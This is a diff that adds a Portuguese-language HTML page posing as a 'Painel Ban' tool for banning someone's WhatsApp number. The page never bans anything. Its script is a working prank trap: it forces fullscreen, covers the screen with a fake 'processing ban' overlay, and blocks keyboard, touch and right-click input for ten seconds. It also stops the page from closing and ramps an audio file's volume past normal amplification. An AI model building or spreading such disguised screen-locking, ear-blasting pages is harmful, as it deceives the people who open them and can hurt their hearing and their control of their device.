@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<meta charset="UTF-8">
+<title>Painel Ban</title>
+
+<style>
+* { box-sizing: border-box; }
+
+body {
+  margin: 0;
+  height: 100vh;
+  font-family: Arial, sans-serif;
+  background: url("fundo.jpg") no-repeat center center fixed;
+  background-size: cover;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+.painel {
+  background: rgba(20, 20, 20, 0.88);
+  backdrop-filter: blur(6px);
+  padding: 30px;
+  border-radius: 12px;
+  width: 90%;
+  max-width: 360px;
+  text-align: center;
+  box-shadow: 0 0 25px rgba(0,255,0,0.25);
+}
+
+h1 {
+  margin: 0;
+  color: #00ff6a;
+  font-size: 24px;
+}
+
+.sub {
+  margin-top: 6px;
+  margin-bottom: 20px;
+  color: #caffc2;
+  font-size: 14px;
+}
+
+input {
+  width: 100%;
+  padding: 12px;
+  border-radius: 6px;
+  border: none;
+  outline: none;
+  background: #222;
+  color: #fff;
+  font-size: 15px;
+}
+
+button {
+  margin-top: 15px;
+  width: 100%;
+  padding: 14px;
+  border-radius: 6px;
+  border: none;
+  background: #00ff00;
+  color: #000;
+  font-size: 16px;
+  font-weight: bold;
+  cursor: pointer;
+}
+
+button:disabled {
+  background: #555;
+  cursor: not-allowed;
+  opacity: 0.6;
+}
+
+/* TELA TRAVADA REAL */
+.lock {
+  position: fixed;
+  inset: 0;
+  background: rgba(0,0,0,0.97);
+  display: none;
+  justify-content: center;
+  align-items: center;
+  z-index: 999999;
+  pointer-events: all;
+  touch-action: none;
+}
+
+.lock h2 {
+  color: red;
+  font-size: 22px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="painel">
+  <h1>Painel da Zennyt Corp</h1>
+  <div class="sub">by vempraluz duban</div>
+
+  <input type="tel" id="numero" placeholder="Passe o Número do WhatsApp">
+  <button id="banir" disabled>ZTC</button>
+</div>
+
+<div class="lock" id="lock">
+  <h2>Processando banimento...</h2>
+</div>
+
+<script>
+const input = document.getElementById("numero");
+const botao = document.getElementById("banir");
+const lock = document.getElementById("lock");
+
+let audioCtx, source, gainNode;
+
+// libera botão só com número
+input.addEventListener("input", () => {
+  botao.disabled = input.value.trim().length < 8;
+});
+
+botao.addEventListener("click", async () => {
+  if (botao.disabled) return;
+
+  // congela tudo
+  lock.style.display = "flex";
+  document.body.style.overflow = "hidden";
+
+  document.documentElement.requestFullscreen?.().catch(()=>{});
+
+  // Web Audio (volume real)
+  audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+  const res = await fetch("audio.mp3");
+  const buf = await res.arrayBuffer();
+  const audioBuffer = await audioCtx.decodeAudioData(buf);
+
+  source = audioCtx.createBufferSource();
+  gainNode = audioCtx.createGain();
+
+  source.buffer = audioBuffer;
+  source.loop = false;
+
+  source.connect(gainNode);
+  gainNode.connect(audioCtx.destination);
+
+  // volume inicial
+  gainNode.gain.value = 0.2;
+  source.start();
+
+  // sobe volume de verdade
+  const volUp = setInterval(() => {
+    if (gainNode.gain.value < 3) {
+      gainNode.gain.value += 0.2;
+    } else {
+      clearInterval(volUp);
+    }
+  }, 300);
+
+  // bloqueios fortes
+  const block = e => {
+    e.preventDefault();
+    e.stopPropagation();
+    return false;
+  };
+
+  document.addEventListener("keydown", block, { passive: false });
+  document.addEventListener("touchstart", block, { passive: false });
+  document.addEventListener("touchmove", block, { passive: false });
+  document.addEventListener("contextmenu", block);
+  window.onbeforeunload = () => "Processando...";
+
+  // libera tela após 10s (áudio continua)
+  setTimeout(() => {
+    lock.style.display = "none";
+    document.body.style.overflow = "";
+    document.removeEventListener("keydown", block);
+    document.removeEventListener("touchstart", block);
+    document.removeEventListener("touchmove", block);
+    document.removeEventListener("contextmenu", block);
+    window.onbeforeunload = null;
+  }, 10000);
+});
+</script>
+
+</body>
+</html>
